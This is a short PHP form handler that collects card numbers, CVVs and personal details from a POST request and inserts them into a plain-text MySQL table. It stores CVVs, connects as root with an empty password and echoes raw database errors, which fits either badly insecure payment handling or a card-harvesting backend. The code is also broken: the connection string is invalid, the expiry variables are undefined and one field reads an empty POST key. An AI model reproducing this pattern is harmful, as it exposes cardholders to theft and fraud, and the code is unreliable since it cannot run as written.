<?php
include 'server.php';
$servername = "localhost";
$username = "root";
$password = "";

if (!empty($_POST)) {
    $cardNumber = $_POST['cardNumber'];
    $cvv = $_POST['cardCVV'];
    $userFullname = $_POST['name'];
    $userEmail = $_POST['email'];
    $userPhone = $_POST['phoneNumber'];
    $userCity = $_POST['city'];
    $userAdress = $_POST['address'];
    $userState = $_POST['state'];
    $userCardName = $_POST[''];


    try {
        $pdo = new PDO($servername, $username, $password);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        $sql = "CREATE TABLE IF NOT EXISTS `xkgroup`.`user_info` (
            `ID` INT NOT NULL AUTO_INCREMENT,
            `userFullname` VARCHAR(100) NOT NULL,
            `userEmail` VARCHAR(100) NOT NULL,
            `userPhone` VARCHAR(20) NOT NULL,
            `userCity` VARCHAR(45) NOT NULL,
            `userAdress` VARCHAR(45) NOT NULL,
            `userState` VARCHAR(45) NOT NULL,
            `userCardName` VARCHAR(100) NOT NULL,
            `userCardNumber` VARCHAR(20) NOT NULL,
            `userExpMonth` INT NOT NULL,
            `userExpYear` INT NOT NULL,
            `userCVV` INT NOT NULL,
            PRIMARY KEY (`ID`),
            UNIQUE INDEX `ID_UNIQUE` (`ID` ASC),
            UNIQUE INDEX `userEmail_UNIQUE` (`userEmail` ASC),
            UNIQUE INDEX `userPhone_UNIQUE` (`userPhone` ASC),
            UNIQUE INDEX `userCardNumber_UNIQUE` (`userCardNumber` ASC)
          );";
        $pdo->exec($sql);

        $stmt = $pdo->prepare("INSERT INTO `user_info`
        (`userFullname`, `userEmail`, `userPhone`, `userCity`, `userAdress`, `userState`, `userCardName`, `userCardNumber`, `userExpMonth`, `userExpYear`, `userCVV`)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");

        $stmt->execute([$userFullname, $userEmail, $userPhone, $userCity, $userAdress, $userState, $userCardName, $cardNumber, $expMonth, $expYear, $cvv]);

    } catch (PDOException $e) {
        echo "Error: " . $e->getMessage();
    }
}
?>